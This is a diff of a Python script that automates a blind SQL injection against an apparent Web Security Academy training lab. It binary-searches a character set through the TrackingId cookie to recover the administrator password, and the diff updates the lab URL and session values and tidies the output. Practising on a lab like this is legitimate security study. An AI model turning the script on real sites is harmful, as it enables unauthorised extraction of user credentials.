@@ -2,9 +2,10 @@
 
 import requests
 
-URL = "https://acf21fff1f156a3ec0f10bbd00d500e2.web-security-academy.net/"
-SESSION = "SvUsl1vRMCCkjTltieACY3Wnu3QNIOsX"
-TRACKING_ID = "SJOD5F28cetQJq7u"
+# Populate environment variables before running
+URL = "https://ac521fc31f914a51c0e602bc0077004e.web-security-academy.net/"
+SESSION = "7uApIQZgaNjGIh30qV26GlP2yG03fdai"
+TRACKING_ID = "uQmLCwhNFX1nMYDL"
 CHAR_SPACE = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
 
 
@@ -22,7 +23,6 @@ def get_pwd_length(cookies):
             res = requests.get(URL, cookies=cookies)
         print("guessed password length: ", guess_len)
         return guess_len
-
 
 
 def cursor_check(cookies, pswd_i, target):
@@ -59,8 +59,6 @@ def recursiveBinarySearch(l, r, cookies, pswd_i):
 
 
 def main():
-    # true: test condition NOT met
-    # error: test condition met
     print("determining password length...")
     cookies = dict(session=SESSION, TrackingId="")
     pwd_length = get_pwd_length(cookies)
@@ -70,16 +68,15 @@ def main():
     admin_pwd = ""
     while cursor <= pwd_length:
         print("determing password character", cursor, "...")
-        cookies["TrackingId"] = ""
         pwd_char_ind = recursiveBinarySearch(0, 35, cookies, cursor)
         try:
             print("password character", cursor, ": ", CHAR_SPACE[pwd_char_ind], "\n")
+            admin_pwd += CHAR_SPACE[pwd_char_ind]
         except IndexError:
-            print("Could not determine password character. Breaking...", "\n")
+            print("Could not determine password character. Here is the portion I was able to guess: ", admin_pwd, "\nBreaking...")
             break
-        admin_pwd += CHAR_SPACE[pwd_char_ind]
         cursor += 1
-    print(admin_pwd)
+    print("Password: ", admin_pwd)
 
 
 main()
